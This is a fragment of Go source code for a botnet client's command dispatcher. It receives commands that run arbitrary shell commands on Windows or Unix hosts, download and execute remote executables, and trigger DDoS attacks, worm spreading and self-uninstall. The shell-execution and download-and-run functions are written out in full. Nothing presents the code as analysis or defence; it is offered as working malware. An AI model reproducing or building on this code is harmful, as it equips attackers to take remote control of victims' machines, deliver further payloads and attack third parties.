package main

import (
    "io"
    "net/http"
    "os"
    "os/exec"
    "runtime"
)

type Command struct {
    ID      string `json:"id"`
    Type    string `json:"type"`
    Payload string `json:"payload"`
    Target  string `json:"target"`
}

type Response struct {
    BotID     string `json:"bot_id"`
    CommandID string `json:"command_id"`
    Output    string `json:"output"`
    Status    string `json:"status"`
}

func executeCommand(cmd Command) Response {
    resp := Response{BotID: botID, CommandID: cmd.ID, Status: "success"}
    
    switch cmd.Type {
    case "exec":
        out, err := shellExec(cmd.Payload)
        if err != nil {
            resp.Status = "failed"
            resp.Output = err.Error()
        } else {
            resp.Output = out
        }
        
    case "download":
        err := downloadAndExec(cmd.Payload)
        if err != nil {
            resp.Status = "failed"
            resp.Output = err.Error()
        } else {
            resp.Output = "Downloaded and executed"
        }
        
    case "ddos":
        go startDDoS(cmd.Target, cmd.Payload)
        resp.Output = "DDoS started"
        
    case "worm":
        go wormSpread()
        resp.Output = "Worm activated"
        
    case "kill":
        uninstall()
        os.Exit(0)
    }
    
    return resp
}

func shellExec(cmdStr string) (string, error) {
    var cmd *exec.Cmd
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd.exe", "/C", cmdStr)
    } else {
        cmd = exec.Command("/bin/sh", "-c", cmdStr)
    }
    out, err := cmd.CombinedOutput()
    return string(out), err
}

func downloadAndExec(url string) error {
    resp, err := http.Get(url)
    if err != nil {
        return err
    }
    defer resp.Body.Close()
    
    tmp, _ := os.CreateTemp("", "*.exe")
    defer tmp.Close()
    
    io.Copy(tmp, resp.Body)
    tmp.Close()
    
    return exec.Command(tmp.Name()).Start()
}
